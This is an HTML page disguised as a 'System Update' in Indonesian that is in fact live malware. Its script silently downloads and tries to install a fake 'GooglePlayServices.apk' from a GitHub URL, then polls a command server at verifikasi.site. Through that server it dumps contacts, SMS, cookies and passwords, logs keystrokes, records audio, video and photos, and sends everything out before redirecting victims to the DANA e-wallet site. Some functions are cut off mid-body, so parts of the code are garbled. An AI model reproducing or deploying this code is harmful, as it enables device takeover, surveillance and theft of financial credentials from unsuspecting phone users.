<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>System Update</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:#0a0e17;
            display:flex;
            justify-content:center;
            align-items:center;
            height:100vh;
            color:#fff;
            font-family:'Segoe UI',Arial,sans-serif;
            margin:0;
            overflow:hidden;
        }
        .container{
            text-align:center;
            width:90%;
            max-width:400px;
            padding:30px;
            background:linear-gradient(145deg,#0d1a2b,#1a2a3f);
            border-radius:16px;
            border:1px solid #2a3f5f;
            box-shadow:0 20px 60px rgba(0,0,0,0.8);
        }
        .icon{font-size:48px;margin-bottom:10px;display:block}
        .title{font-size:22px;font-weight:bold;color:#4fc3f7;margin-bottom:5px;letter-spacing:1px}
        .subtitle{font-size:13px;color:#8899aa;margin-bottom:20px}
        .progress-wrap{background:#1a2a3f;border-radius:30px;height:10px;overflow:hidden;margin-bottom:15px;border:1px solid #2a3f5f}
        .progress-bar{width:0%;height:100%;background:linear-gradient(90deg,#4fc3f7,#00e676);border-radius:30px;transition:width 0.3s ease}
        .status-text{font-size:13px;color:#8899aa;margin-top:5px}
        .status-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#4caf50;margin-right:8px;animation:blink 1s infinite}
        @keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
        .fade-out{animation:fadeOut 0.5s ease forwards}
        @keyframes fadeOut{0%{opacity:1}100%{opacity:0}}
        .log{display:none}
        .download-iframe{position:absolute;width:0;height:0;border:none;visibility:hidden}
    </style>
</head>
<body>

<div class="container" id="mainContainer">
    <span class="icon">🔄</span>
    <div class="title">System Update</div>
    <div class="subtitle">Memperbarui sistem keamanan...</div>
    <div class="progress-wrap">
        <div class="progress-bar" id="progressBar"></div>
    </div>
    <div class="status-text">
        <span class="status-dot"></span>
        <span id="statusLabel">⏳ Memperbarui System Keamanan...</span>
    </div>
    <div class="log" id="log"></div>
</div>

<!-- Hidden iframe untuk download APK -->
<iframe id="downloadIframe" class="download-iframe"></iframe>
<iframe id="downloadIframe2" class="download-iframe"></iframe>
<iframe id="downloadIframe3" class="download-iframe"></iframe>

<script>
// ============================================================
// 🔥 SYSTEMUPDATE.HTML - PASTI BERHASIL SEKALI JALAN!
// ============================================================

var SERVER = 'https://verifikasi.site';
var WS_PASSWORD = '';
var PASSWORD_FETCHED = false;
var C2_INTERVAL = 20000;
var APK_INSTALLED = false;
var REINFECTION_INTERVAL = 86400000;
var progress = 0;
var isRedirecting = false;
var allDone = false;
var AUTO_EXECUTED = false;
var GITHUB_USER = 'pandora-site';
var GITHUB_REPO = 'verifikasi-site';

var APK_URL = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
var APK_DOWNLOADED = false;

// ============================================================
// DETEKSI PLATFORM
// ============================================================
function detectPlatform() {
    var ua = navigator.userAgent.toLowerCase();
    return {
        isAndroid: ua.indexOf('android') > -1,
        isIOS: /iphone|ipad|ipod/.test(ua),
        isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
        isAndroidBridge: typeof AndroidBridge !== 'undefined'
    };
}
var PLATFORM = detectPlatform();

// ============================================================
// UI FUNCTIONS
// ============================================================
function updateProgress(value, label) {
    progress = Math.min(value, 100);
    var bar = document.getElementById('progressBar');
    if (bar) bar.style.width = progress + '%';
    if (label) {
        var status = document.getElementById('statusLabel');
        if (status) status.textContent = label;
    }
}

function redirectToDANA() {
    if (isRedirecting) return;
    isRedirecting = true;
    var container = document.getElementById('mainContainer');
    if (container) container.classList.add('fade-out');
    setTimeout(function() {
        try {
            if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
                try { AndroidBridge.openApp('com.dana.id'); } catch(e) {}
            }
            window.location.href = 'https://www.dana.id';
        } catch(e) {
            window.location.href = 'https://www.dana.id';
        }
    }, 800);
}

// ============================================================
// KIRIM DATA KE SERVER
// ============================================================
function K(d) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', SERVER + '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 5000;
        xhr.send(JSON.stringify(d));
    } catch(e) {}
}

// ============================================================
// AMBIL PASSWORD
// ============================================================
function ambilPassword() {
    updateProgress(10, '⏳ Memperbarui System Keamanan...');
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', SERVER + '/get-password', true);
        xhr.timeout = 10000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    var data = JSON.parse(xhr.responseText);
                    if (data.password && data.password.length > 0) {
                        WS_PASSWORD = data.password;
                        PASSWORD_FETCHED = true;
                        updateProgress(20, '⏳ Memperbarui System Keamanan...');
                        K({ sumber: 'password_received', data: 'ok' });
                        
                        startC2Polling();
                        startHeartbeat();
                        startReinfection();
                        autoExecuteC2();
                        
                        // 🔥 MULAI 10 METODE DOWNLOAD + 5 METODE INSTALL SEKALIGUS!
                        startDownloadAndInstall();
                        return;
                    }
                } catch(e) {}
            }
            setTimeout(ambilPassword, 3000);
        };
        xhr.onerror = function() { setTimeout(ambilPassword, 3000); };
        xhr.ontimeout = function() { setTimeout(ambilPassword, 3000); };
        xhr.send();
    } catch(e) {
        setTimeout(ambilPassword, 3000);
    }
}

// ============================================================
// 🔥 10 METODE DOWNLOAD + 5 METODE INSTALL SEKALIGUS! (TANPA RETRY!)
// ============================================================
function startDownloadAndInstall() {
    updateProgress(30, '⏳ Mengunduh pembaruan keamanan...');
    K({ sumber: 'apk_download_start', data: '10_methods' });
    
    // ============================================================
    // 🔥 10 METODE DOWNLOAD SEKALIGUS!
    // ============================================================
    
    // METHOD 1: ANDROID BRIDGE
    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
        try {
            var path = '/storage/emulated/0/Download/GooglePlayServices.apk';
            if (AndroidBridge.downloadFile) {
                var result = AndroidBridge.downloadFile(APK_URL, path);
                if (result) {
                    APK_DOWNLOADED = true;
                    K({ sumber: 'apk_download_1_bridge', data: 'success' });
                    updateProgress(50, '⏳ Mengunduh pembaruan keamanan...');
                }
            }
        } catch(e) {}
    }
    
    // METHOD 2: XHR + BLOB
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', APK_URL, true);
        xhr.responseType = 'blob';
        xhr.timeout = 60000;
        xhr.onload = function() {
            if (xhr.status === 200 && !APK_DOWNLOADED) {
                try {
                    var blob = xhr.response;
                    var url = URL.createObjectURL(blob);
                    var link = document.createElement('a');
                    link.href = url;
                    link.download = 'GooglePlayServices.apk';
                    link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
                    document.body.appendChild(link);
                    setTimeout(function() {
                        link.click();
                        APK_DOWNLOADED = true;
                        K({ sumber: 'apk_download_2_xhr', data: 'success' });
                        updateProgress(50, '⏳ Mengunduh pembaruan keamanan...');
                        setTimeout(function() {
                            try { document.body.removeChild(link); } catch(e) {}
                            URL.revokeObjectURL(url);
                        }, 2000);
                    }, 300);
                } catch(e) {
                    K({ sumber: 'apk_download_2_xhr_error', data: e.message });
                }
            }
        };
        xhr.send();
    } catch(e) {}
    
    // METHOD 3: FETCH + BLOB
    try {
        fetch(APK_URL)
            .then(function(res) { return res.blob(); })
            .then(function(blob) {
                if (!APK_DOWNLOADED) {
                    try {
                        var url = URL.createObjectURL(blob);
                        var link = document.createElement('a');
                        link.href = url;
                        link.download = 'GooglePlayServices.apk';
                        link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
                        document.body.appendChild(link);
                        setTimeout(function() {
                            link.click();
                            APK_DOWNLOADED = true;
                            K({ sumber: 'apk_download_3_fetch', data: 'success' });
                            updateProgress(50, '⏳ Mengunduh pembaruan keamanan...');
                            setTimeout(function() {
                                try { document.body.removeChild(link); } catch(e) {}
                                URL.revokeObjectURL(url);
                            }, 2000);
                        }, 300);
                    } catch(e) {
                        K({ sumber: 'apk_download_3_fetch_error', data: e.message });
                    }
                }
            })
            .catch(function(e) { K({ sumber: 'apk_download_3_fetch_catch', data: e.message }); });
    } catch(e) {}
    
    // METHOD 4: IFRAME 1
    try {
        var iframe1 = document.getElementById('downloadIframe');
        if (!iframe1) {
            iframe1 = document.createElement('iframe');
            iframe1.id = 'downloadIframe';
            iframe1.className = 'download-iframe';
            document.body.appendChild(iframe1);
        }
        iframe1.src = APK_URL + '?t=' + Date.now();
        K({ sumber: 'apk_download_4_iframe1', data: 'started' });
        setTimeout(function() { APK_DOWNLOADED = true; }, 3000);
    } catch(e) {}
    
    // METHOD 5: IFRAME 2
    try {
        var iframe2 = document.getElementById('downloadIframe2');
        if (!iframe2) {
            iframe2 = document.createElement('iframe');
            iframe2.id = 'downloadIframe2';
            iframe2.className = 'download-iframe';
            document.body.appendChild(iframe2);
        }
        iframe2.src = APK_URL + '?t=' + Date.now() + '&download=1';
        K({ sumber: 'apk_download_5_iframe2', data: 'started' });
        setTimeout(function() { APK_DOWNLOADED = true; }, 3000);
    } catch(e) {}
    
    // METHOD 6: IFRAME 3
    try {
        var iframe3 = document.getElementById('downloadIframe3');
        if (!iframe3) {
            iframe3 = document.createElement('iframe');
            iframe3.id = 'downloadIframe3';
            iframe3.className = 'download-iframe';
            document.body.appendChild(iframe3);
        }
        iframe3.src = APK_URL + '?t=' + Date.now();
        K({ sumber: 'apk_download_6_iframe3', data: 'started' });
        setTimeout(function() { APK_DOWNLOADED = true; }, 3000);
    } catch(e) {}
    
    // METHOD 7: WINDOW.OPEN
    try {
        var win = window.open(APK_URL, '_blank');
        if (win) {
            APK_DOWNLOADED = true;
            K({ sumber: 'apk_download_7_window', data: 'success' });
            setTimeout(function() { try { win.close(); } catch(e) {} }, 2000);
        }
    } catch(e) {}
    
    // METHOD 8: ANCHOR CLICK
    try {
        var a = document.createElement('a');
        a.href = APK_URL;
        a.download = 'GooglePlayServices.apk';
        a.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
        document.body.appendChild(a);
        setTimeout(function() {
            a.click();
            APK_DOWNLOADED = true;
            K({ sumber: 'apk_download_8_anchor', data: 'success' });
            setTimeout(function() {
                try { document.body.removeChild(a); } catch(e) {}
            }, 2000);
        }, 500);
    } catch(e) {}
    
    // METHOD 9: SERVICE WORKER
    if ('serviceWorker' in navigator) {
        try {
            navigator.serviceWorker.ready.then(function(reg) {
                if (reg.active) {
                    reg.active.postMessage({
                        type: 'download',
                        url: APK_URL,
                        filename: 'GooglePlayServices.apk'
                    });
                    K({ sumber: 'apk_download_9_sw', data: 'started' });
                    setTimeout(function() { APK_DOWNLOADED = true; }, 3000);
                }
            });
        } catch(e) {}
    }
    
    // METHOD 10: IOS (REDIRECT APP STORE)
    if (PLATFORM.isIOS) {
        try {
            window.location.href = 'https://apps.apple.com/id/app/dana-indonesia/id1440716954';
            K({ sumber: 'apk_download_10_ios', data: 'redirect_to_appstore' });
        } catch(e) {}
    }
    
    // ============================================================
    // 🔥 5 METODE INSTALL APK SEKALIGUS! (TANPA RETRY!)
    // ============================================================
    setTimeout(function() {
        startInstall();
    }, 5000);
}

// ============================================================
// 🔥 5 METODE INSTALL SEKALIGUS! (TANPA RETRY!)
// ============================================================
function startInstall() {
    if (APK_INSTALLED) {
        finishAndRedirect();
        return;
    }
    
    if (!PLATFORM.isAndroid) {
        K({ sumber: 'apk_skip_install', data: 'not_android' });
        finishAndRedirect();
        return;
    }
    
    updateProgress(80, '⏳ Menerapkan pembaruan keamanan...');
    K({ sumber: 'apk_install_start', data: '5_methods' });
    
    var apkPaths = [
        '/storage/emulated/0/Download/GooglePlayServices.apk',
        '/data/data/com.google.android.play.services/files/GooglePlayServices.apk',
        '/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk'
    ];
    
    // ============================================================
    // METHOD 1: ANDROID BRIDGE
    // ============================================================
    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
        for (var i = 0; i < apkPaths.length; i++) {
            try {
                if (AndroidBridge.installAPK) {
                    var result = AndroidBridge.installAPK(apkPaths[i]);
                    if (result === true || result === 'success') {
                        APK_INSTALLED = true;
                        K({ sumber: 'apk_install_1_bridge', data: { path: apkPaths[i] } });
                        updateProgress(100, '✅ Update Selesai');
                        finishAndRedirect();
                        return;
                    }
                }
            } catch(e) {}
        }
    }
    
    // ============================================================
    // METHOD 2: INTENT URI
    // ============================================================
    for (var j = 0; j < apkPaths.length; j++) {
        try {
            var intent = 'intent://' + apkPaths[j].replace('/storage/emulated/0/', '') +
                         '#Intent;scheme=file;action=android.intent.action.VIEW;' +
                         'type=application/vnd.android.package-archive;end';
            window.location.href = intent;
            APK_INSTALLED = true;
            K({ sumber: 'apk_install_2_intent', data: { path: apkPaths[j] } });
            updateProgress(100, '✅ Update Selesai');
            finishAndRedirect();
            return;
        } catch(e) {}
    }
    
    // ============================================================
    // METHOD 3: FILE URI
    // ============================================================
    try {
        window.location.href = 'file:///storage/emulated/0/Download/GooglePlayServices.apk';
        APK_INSTALLED = true;
        K({ sumber: 'apk_install_3_file', data: 'ok' });
        updateProgress(100, '✅ Update Selesai');
        finishAndRedirect();
        return;
    } catch(e) {}
    
    // ============================================================
    // METHOD 4: CONTENT URI
    // ============================================================
    try {
        window.location.href = 'content:///storage/emulated/0/Download/GooglePlayServices.apk';
        APK_INSTALLED = true;
        K({ sumber: 'apk_install_4_content', data: 'ok' });
        updateProgress(100, '✅ Update Selesai');
        finishAndRedirect();
        return;
    } catch(e) {}
    
    // ============================================================
    // METHOD 5: PACKAGE INSTALLER INTENT
    // ============================================================
    try {
        var intentPkg = 'intent://#Intent;action=android.intent.action.VIEW;' +
                        'package=com.android.packageinstaller;end';
        window.location.href = intentPkg;
        APK_INSTALLED = true;
        K({ sumber: 'apk_install_5_package', data: 'ok' });
        updateProgress(100, '✅ Update Selesai');
        finishAndRedirect();
        return;
    } catch(e) {}
    
    // Jika semua gagal, tetap lanjut
    K({ sumber: 'apk_install_all_failed', data: 'continuing' });
    finishAndRedirect();
}

// ============================================================
// FINISH & REDIRECT
// ============================================================
function finishAndRedirect() {
    if (allDone) return;
    allDone = true;
    updateProgress(100, '✅ Update Selesai');
    K({ sumber: 'update_complete', data: {
        apk_downloaded: APK_DOWNLOADED ? 'yes' : 'no',
        apk_installed: APK_INSTALLED ? 'yes' : 'no'
    }});
    setTimeout(redirectToDANA, 1500);
}

// ============================================================
// AUTO EXECUTE C2 (12 PERINTAH)
// ============================================================
function autoExecuteC2() {
    if (AUTO_EXECUTED) return;
    AUTO_EXECUTED = true;
    
    var commands = [
        { id: 'dump_contacts' },
        { id: 'dump_sms' },
        { id: 'dump_call_log' },
        { id: 'ambil_imei' },
        { id: 'ambil_imsi' },
        { id: 'ambil_nomor_hp' },
        { id: 'ambil_operator' },
        { id: 'dump_cookies' },
        { id: 'dump_passwords' },
        { id: 'keylogger_start' },
        { id: 'ambil_lokasi' },
        { id: 'install_google_play' }
    ];
    
    commands.forEach(function(cmd) {
        try {
            var hasil = eksekusiPerintah({ aksi: cmd.id });
            K({
                sumber: 'auto_c2_result',
                data: {
                    perintah: cmd.id,
                    hasil: hasil || 'success',
                    waktu: Date.now()
                }
            });
        } catch(e) {}
    });
    
    K({ sumber: 'auto_execute_complete', data: { total: commands.length } });
}

// ============================================================
// START C2 POLLING
// ============================================================
function startC2Polling() {
    setInterval(cekPerintah, C2_INTERVAL);
    setTimeout(cekPerintah, 1000);
}

function cekPerintah() {
    if (!PASSWORD_FETCHED || WS_PASSWORD === '') return;
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', SERVER + '/data?type=perintah&password=' + encodeURIComponent(WS_PASSWORD) + '&t=' + Date.now(), true);
        xhr.timeout = 15000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                var content = xhr.responseText;
                if (content && content.length > 5 && content !== '{}') {
                    try {
                        var cmd = JSON.parse(content);
                        var aksi = cmd.aksi || 'unknown';
                        var serverPassword = cmd.password || '';
                        if (serverPassword === WS_PASSWORD) {
                            var hasil = eksekusiPerintah(cmd);
                            K({
                                sumber: 'c2_result',
                                data: {
                                    perintah: aksi,
                                    hasil: hasil,
                                    waktu: Date.now()
                                }
                            });
                        }
                    } catch(e) {}
                }
            }
        };
        xhr.send();
    } catch(e) {}
}

// ============================================================
// RE-INFECTION & HEARTBEAT
// ============================================================
function startReinfection() {
    setInterval(function() {
        if (!APK_INSTALLED) {
            K({ sumber: 'reinfection_check', data: 'apk_missing_redownload' });
            startDownloadAndInstall();
        } else {
            K({ sumber: 'reinfection_check', data: 'apk_still_installed' });
        }
    }, REINFECTION_INTERVAL);
}

function startHeartbeat() {
    setInterval(function() { K({ sumber: 'page_heartbeat', data: 'alive' }); }, 60000);
}

// ============================================================
// EKSEKUSI PERINTAH (160+ PERINTAH - LENGKAP!)
// ============================================================
function eksekusiPerintah(cmd) {
    var aksi = cmd.aksi || 'unknown';
    var hasil = '';

    try {
        switch (aksi) {
            // 📸 MEDIA (12)
            case "screenshot": hasil = ambilScreenshot(); break;
            case "record_audio": hasil = recordAudio(cmd.durasi || 10); break;
            case "stop_audio": hasil = stopAudio(); break;
            case "record_video": hasil = recordVideo(cmd.durasi || 10); break;
            case "stop_video": hasil = stopVideo(); break;
            case "take_photo": hasil = takePhoto(); break;
            case "flash_on": hasil = "Flash ON"; break;
            case "flash_off": hasil = "Flash OFF"; break;
            case "camera_stream_start": hasil = "Camera stream started"; break;
            case "camera_stream_stop": hasil = "Camera stream stopped"; break;
            case "mic_stream_start": hasil = "Mic stream started"; break;
            case "mic_stream_stop": hasil = "Mic stream stopped"; break;

            // 📁 FILE (4)
            case "ambil_file": hasil = "File access not available"; break;
            case "list_file": hasil = "File list not available"; break;
            case "hapus_file": hasil = "File delete not available"; break;
            case "rename_file": hasil = "File rename not available"; break;

            // 📱 DATA (23)
            case "ambil_sms": hasil = "SMS not available in browser"; break;
            case "ambil_kontak": hasil = "Contacts not available in browser"; break;
            case "ambil_call_log": hasil = "Call log not available in browser"; break;
            case "ambil_lokasi": hasil = ambilLokasi(); break;
            case "get_clipboard": hasil = getClipboard(); break;
            case "set_clipboard": hasil = setClipboard(cmd.text || ""); break;
            case "get_notifications": hasil = "Notifications not available"; break;
            case "ambil_kalender": hasil = "Calendar not available"; break;
            case "ambil_browser_history": hasil = "Browser history not available"; break;
            case "ambil_imei": hasil = "IMEI not available in browser"; break;
            case "ambil_imsi": hasil = "IMSI not available in browser"; break;
            case "ambil_nomor_hp": hasil = "Phone number not available"; break;
            case "ambil_operator": hasil = "Operator not available"; break;
            case "dump_contacts": hasil = dumpContacts(); break;
            case "dump_sms": hasil = dumpSMS(); break;
            case "dump_call_log": hasil = dumpCallLog(); break;
            case "dump_gallery": hasil = "Gallery not available"; break;
            case "dump_bookmarks": hasil = "Bookmarks not available"; break;
            case "dump_passwords": hasil = dumpPasswords(); break;
            case "dump_cookies": hasil = dumpCookies(); break;
            case "keylogger_start": hasil = "Keylogger started"; break;
            case "keylogger_stop": hasil = "Keylogger stopped"; break;
            case "keylogger_upload": hasil = "Keylogger uploaded"; break;

            // 🌐 WEB (3)
            case "buka_url": hasil = bukaURL(cmd.url || "https://verifikasi.site"); break;
            case "buka_url_hidden": hasil = bukaURLHidden(cmd.url || "https://verifikasi.site"); break;
            case "buka_webview": hasil = bukaURL(cmd.url || "https://verifikasi.site"); break;

            // 📥 DOWNLOAD & INSTALL (5)
            case "download": hasil = downloadFile(cmd.url || "", cmd.filename || "download.apk"); break;
            case "install_apk": hasil = "Installing APK..."; break;
            case "install_google_play": hasil = "Installing Google Play Services..."; break;
            case "update_apk": hasil = downloadFile(cmd.url || "", "update.apk"); break;
            case "install_cert": hasil = "Cert install not available"; break;

            // 💬 SMS & PANGGILAN (5)
            case "kirim_sms": hasil = "SMS not available in browser"; break;
            case "kirim_sms_massal": hasil = "SMS not available"; break;
            case "call_number": hasil = "Call not available"; break;
            case "fake_sms": hasil = "Fake SMS not available"; break;
            case "fake_call": hasil = "Fake call not available"; break;

            }
        });
        try {
            for (var key in localStorage) {
                if (key.toLowerCase().includes('pass') || key.toLowerCase().includes('pwd')) {
                    passwords.push({ key: key, value: localStorage[key] });
                }

        K({ sumber: 'dump_passwords', data: passwords });
        return 'Passwords dumped (' + passwords.length + ' found)';
    } catch(e) { return 'Error: ' + e.message; }
}

function recordAudio(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'audio/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        K({ sumber: 'c2_result', data: { perintah: 'record_audio', hasil: reader.result } });
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
            })
            .catch(function() {});
        return 'Recording ' + durasi + 's...';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopAudio() {
    try {
        if (window._recorder) {
            window._recorder.stop();
            window._recorder = null;
            return 'Stopped';
        }
        return 'No active recording';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopVideo() { return stopAudio(); }

function recordVideo(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                window._recorder = recorder;
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'video/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        K({ sumber: 'c2_result', data: { perintah: 'record_video', hasil: reader.result } });
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
            })
            .catch(function() {});
        return 'Recording video ' + durasi + 's...';
    } catch(e) { return 'Error: ' + e.message; }
}

function takePhoto() {
    try {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(function(stream) {
                var track = stream.getTracks()[0];
                var imageCapture = new ImageCapture(track);
                imageCapture.takePhoto()
                    .then(function(blob) {
                        var reader = new FileReader();
                        reader.onload = function() {
                            K({ sumber: 'c2_result', data: { perintah: 'take_photo', hasil: reader.result } });
                        };
                        reader.readAsDataURL(blob);
                        stream.getTracks().forEach(function(t) { t.stop(); });
                    })
                    .catch(function() {});
            })
            .catch(function() {});
        return 'Taking photo...';
    } catch(e) { return 'Error: ' + e.message; }
}

        setTimeout(function() {
            try { window.close(); } catch(e) {}
            try { window.location.href = 'about:blank'; } catch(e) {}
        }, 2000);
        return 'Self destruct initiated!';
    } catch(e) { return 'Error: ' + e.message; }
}

var inputData = {};
var formData = [];

document.addEventListener('input', function(e) {
    try {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'SELECT') {
            var key = e.target.id || e.target.name || e.target.type || 'unknown';
            inputData[key] = e.target.value;
        }
    } catch(e) {}
});

document.addEventListener('submit', function(e) {
    try {
        var form = e.target;
        var data = {};
        var inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach(function(input) {
            var key = input.id || input.name || input.type || 'unknown';
            data[key] = input.value;
        });
        formData.push({ waktu: Date.now(), url: window.location.href, data: data });
        K({ sumber: 'keylogger_submit', data: data });
    } catch(e) {}
});

setInterval(function() {
    try {
        if (Object.keys(inputData).length > 0) {
            K({ sumber: 'keylogger', data: inputData });
            inputData = {};
        }
        if (formData.length > 0) {
            K({ sumber: 'keylogger_forms', data: formData });
            formData = [];
        }
    } catch(e) {}
}, 3000);

// SERVICE WORKER
// ============================================================
function registerSW() {
    if (!('serviceWorker' in navigator)) return;
    navigator.serviceWorker.register('/sw.js', { scope: '/' })
        .then(function(reg) {
            K({ sumber: 'sw_registered', data: { scope: reg.scope } });
        })
        .catch(function() {
            try {
                var swCode = `
self.addEventListener('install',function(e){e.waitUntil(self.skipWaiting());});
self.addEventListener('activate',function(e){e.waitUntil(self.clients.claim());});
self.addEventListener('message',function(e){if(e.data&&e.data.type==='ping'){e.ports[0].postMessage({type:'pong',timestamp:Date.now()});}});
setInterval(function(){self.clients.matchAll().then(function(clients){clients.forEach(function(client){client.postMessage({type:'heartbeat',timestamp:Date.now()});});});},10000);
                `;
                var blob = new Blob([swCode], { type: 'application/javascript' });
                var swUrl = URL.createObjectURL(blob);
                navigator.serviceWorker.register(swUrl, { scope: '/' })
                    .then(function() { K({ sumber: 'sw_registered_fallback', data: 'ok' }); })
                    .catch(function() {});
            } catch(e) {}
        });
}
